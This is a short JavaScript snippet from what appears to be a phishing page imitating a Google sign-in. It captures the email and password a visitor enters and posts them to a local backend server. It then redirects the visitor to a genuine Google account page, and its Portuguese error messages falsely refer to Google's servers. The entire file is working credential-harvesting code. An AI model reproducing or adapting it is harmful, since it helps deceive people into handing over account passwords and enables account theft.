document.getElementById('nextButton').addEventListener('click', function() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const errorMessage = document.getElementById('error-message');

    if (email && password) {
        // Send data to the server
        fetch('http://localhost:3000/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email, password })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // Redirect to the specified URL
                window.location.href = 'https://myaccount.google.com/u/1/?utm_source=account-marketing-page&utm_medium=go-to-account-button&pli=1&pageId=none';
            } else {
                errorMessage.textContent = 'Falha ao enviar as informações';
            }
        })
        .catch(error => {
            console.error('Error:', error);
            errorMessage.textContent = 'Erro ao se conectar aos servidores da Google';
        });
    } else {
        errorMessage.textContent = 'As informações não foram fornecidas corretamente';
    }
});
